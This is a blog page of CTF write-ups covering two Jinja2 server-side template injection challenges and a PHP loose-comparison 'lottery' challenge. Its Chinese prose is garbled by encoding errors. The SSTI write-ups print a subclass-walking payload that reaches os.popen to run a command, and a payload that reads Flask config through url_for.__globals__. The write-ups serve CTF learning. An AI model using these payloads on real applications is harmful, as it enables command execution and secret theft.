          <h4 id="buuä¸¤é“SSTI"><a href="#buuä¸¤é“SSTI" class="headerlink" title="buuä¸¤é“SSTI"></a>buuä¸¤é“SSTI</h4><h5 id="1-é¢˜ç›®ï¼š"><a href="#1-é¢˜ç›®ï¼š" class="headerlink" title="1.é¢˜ç›®ï¼š"></a>1.é¢˜ç›®ï¼š</h5><h5 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h5><h6 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h6><p>è¿›å…¥é¢˜ç›®ï¼Œåªæœ‰ä¸€ä¸ªé¡µé¢â€¦â€¦éšä¾¿è®¿é—®ä¸€ä¸ªï¼š</p>
<img src="/images/buuä¸¤é“SSTI/image-20210310193328950.png" alt="image-20210310193328950" style="zoom:50%;" />

<p><img src="/images/buu%E4%B8%A4%E9%81%93SSTI/image-20210310193457920.png" alt="image-20210310193457920"></p>
<p>å¾—åˆ°é…ç½®</p>
<p>è¿™é‡Œç®€å•çš„lipsumæ–¹æ³•ä¼¼ä¹ä¸è¡Œâ€¦â€¦åœ¨ä¸ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨æ¨¡æ¿æ”¯æŒçš„pythonè¯­å¥è¿›è¡Œéå†ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;c.__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°æŒ‡å®šçš„æ¨¡å—å¹¶è¿ç”¨å³å¯ï¼š</p>
<img src="/images/buuä¸¤é“SSTI/image-20210310194103588.png" alt="image-20210310194103588" style="zoom:50%;" />

<img src="/images/buuä¸¤é“SSTI/image-20210310194117771.png" alt="image-20210310194117771" style="zoom:50%;" />

<p>è·å¾—flag</p>
<h6 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h6><p>è¿›å…¥é¢˜ç›®å‘ç°ç»™äº†pythonçš„æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<p>è®¾ç½®äº†ä¸€ä¸ªflaskå¯¹è±¡ï¼šapp flagå¤§æ¦‚æ˜¯è¢«è®¾ç½®åˆ°å¯¹è±¡çš„é…ç½®æ–‡ä»¶ä¸­</p>
<p>è·¯ç”±ä¸­æœ‰ï¼š/shrine/&lt;path:shrine&gt;</p>
<p>è®¿é—®å¹¶æŸ¥çœ‹æºç ï¼š</p>
<p><img src="/images/buu%E4%B8%A4%E9%81%93SSTI/image-20210310193240514.png" alt="image-20210310193240514"></p>
<p>SSTIâ€¦â€¦blaklist</p>
<p>ç›¸å½“äºï¼š+s</p>
<p>è¿˜ä¼šæ›¿æ¢ â€˜(â€˜ å’Œ â€˜)â€™  â€¦â€¦</p>
<blockquote>
<p>è¿™é‡Œè¦æ³¨æ„ï¼Œconfigæ˜¯flaskä¸­çš„å˜é‡ï¼Œè®°å½•äº†æ•´ä¸ªé…ç½®ä¿¡æ¯ã€‚set config=Noneä»…ä»…æ˜¯ä½¿å¾—æ­¤æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œè€Œä¸æ˜¯æ›¿æ¢â€™configâ€˜ä¸ºâ€™Noneâ€˜ï¼Œæ‰€ä»¥  ä¼šè¿”å›Noneã€‚æˆ‘ä»¬ä»æœ‰å…¶ä»–æ–¹æ³•è®¿é—®configã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self.__dict__&#125;&#125;ä¹Ÿå¯ä»¥å¾—åˆ°configï¼Œåªæ˜¯åŒæ ·è¢«ç¦ç”¨äº†â€¦â€¦</span><br></pre></td></tr></table></figure>

<p> <strong>Flaskç‰¹æœ‰çš„å˜é‡å’Œå‡½æ•°</strong></p>
<p>config | request | session | url_for() | get_flashed_messages()</p>
<p>è¯¦ç»†æ–¹æ³•ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/enjolras_fuu/article/details/82229073">https://blog.csdn.net/enjolras_fuu/article/details/82229073</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨url_for.__globals__ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æœ‰å…³appé…ç½®çš„æ¨¡å—current_app</span><br><span class="line">å¯ä»¥é€šè¿‡&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;æ¥è¯»å–å½“å‰å¯¹è±¡çš„é…ç½®</span><br><span class="line">get_flashed_messagesä¸­å¥½åƒä¹Ÿæœ‰â€¦â€¦</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æˆ–è®¸è¿™ç§æƒ…å†µåº”è¯¥åœ¨è¿™äº›å‡½æ•°ä¸­ç¿»ä¸€ç¿»ç›¸å…³çš„æ–‡ä»¶â€¦â€¦å°±èƒ½æ‰¾åˆ°æ–¹æ³•</p>
</blockquote>
<img src="/images/buuä¸¤é“SSTI/image-20210310193254568.png" alt="image-20210310193254568" style="zoom:67%;" />

<p>è·å¾—flag</p>
<blockquote>
<p>ä¸¤é“é¢˜æ˜¯ä¸åŒçš„è€ƒç‚¹ï¼Œéƒ½æ˜¯åŸºç¡€â€¦â€¦</p>
<p>å­¦ä¹ äº†â€¦â€¦</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/10/xctf-lottery/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/xctf-lottery/" class="post-title-link" itemprop="url">xctf-lottery</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-10 12:43:53 / ä¿®æ”¹æ—¶é—´ï¼š13:18:23" itemprop="dateCreated datePublished" datetime="2021-03-10T12:43:53+08:00">2021-03-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="xctf-lottery"><a href="#xctf-lottery" class="headerlink" title="xctf-lottery"></a>xctf-lottery</h4><h5 id="1-é¢˜ç›®ï¼š"><a href="#1-é¢˜ç›®ï¼š" class="headerlink" title="1.é¢˜ç›®ï¼š"></a>1.é¢˜ç›®ï¼š</h5><h5 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h5><p>lotteryï¼Œå½©ç¥¨ç½‘ç«™â€¦â€¦</p>
<p>æ”»é˜²ä¸–ç•Œç›´æ¥ç»™äº†é™„ä»¶ï¼Œå®é™…ä¸Šé¢˜ç›®å­˜åœ¨/.gitæºç æ³„éœ²ï¼š</p>
<img src="/images/xctf-lottery/image-20210310124701047.png" alt="image-20210310124701047" style="zoom:60%;" />

<p>å¾ˆå¤šphpæ–‡ä»¶ï¼Œæœ‰sessionçš„å‚¨å­˜ï¼Œä½†ä¼¼ä¹ä¸æ˜¯flask sessionä¼ªé€ ï¼Œconfigé‡Œä¹Ÿæ²¡æœ‰keyä¹‹ç±»çš„â€¦â€¦å¤§éƒ¨åˆ†æ“ä½œéƒ½é›†æˆåœ¨apiä¸­ï¼Œapiæ¥å—jsonæ ¼å¼çš„æ•°æ®ã€‚ä¸åƒHgameçš„å¾®ç§¯åˆ†æ•°å­¦é¢˜ï¼Œå¯ä»¥è‡ªåŠ¨è·å–å…¬å¼è®¡ç®—åˆ·åˆ†ï¼Œè¿™é‡Œçš„å½©ç¥¨æ•°å­—æ˜¯éšæœºçš„ï¼š</p>
<p><img src="/images/xctf-lottery/image-20210310125320868.png" alt="image-20210310125320868"></p>
<p>é‚£ç½‘ç«™å“ªé‡Œä¼šå‡ºé—®é¢˜ï¼Œæ—¢æ²¡æœ‰åƒæ ·çš„ç”¨æˆ·ç™»å½•ï¼Œsessionä¼¼ä¹ä¹Ÿæ²¡æ¯›ç—…â€¦â€¦</p>
<p>åŸæ¥æ˜¯phpå¼±æ¯”è¾ƒå¯¼è‡´çš„æ¼æ´ï¼š</p>
<p><img src="/images/xctf-lottery/image-20210310130729735.png" alt="image-20210310130729735"></p>
<blockquote>
<p>â€¦â€¦</p>
</blockquote>
<p>ç›´æ¥éå†äº†è¾“å…¥çš„numberï¼Œnumberçš„æ­£å¸¸è¾“å…¥æœ¬åº”è¯¥ä¸ºå­—ç¬¦ä¸²ï¼Œä½†jsonæ”¯æŒæ•°ç»„</p>
<blockquote>
<p>æ³¨æ„ï¼Œåœ¨ä½¿ç”¨==æ¯”è¾ƒæ—¶ï¼Œtrueæ˜¯å¯ä»¥å’Œä»»ä½•ç±»å‹çš„å­—ç¬¦ä¸²æˆ–æ•°å­—ç›¸ç­‰ï¼Œè¿”å›trueï¼Œå½“ç„¶0å’Œfalseå’Œnullé™¤å¤–ï¼ˆtrue==0æˆ–true==falseæˆ–true==nullï¼‰</p>
</blockquote>
<p>å¯ä»¥ä½¿ç”¨æ•°ç»„ä¼ å…¥å¸ƒå°”å€¼è¾¾åˆ°æ’ç­‰ï¼š</p>
<img src="/images/xctf-lottery/image-20210310131637110.png" alt="image-20210310131637110" style="zoom:80%;" />

<img src="/images/xctf-lottery/image-20210310131712557.png" alt="image-20210310131712557" style="zoom:89%;" />

<blockquote>
<p>åˆ·é’±ä¹°flagå³å¯â€¦â€¦</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="inanb"
      src="/images/header.jpg">
  <p class="site-author-name" itemprop="name">inanb</p>
  <div class="site-description" itemprop="description">é“é©¬å†°æ²³å…¥æ¢¦æ¥</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">92</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS â†’ &#x2F;atom.xml"><i class="fas fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">inanb</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

</body>
</html>
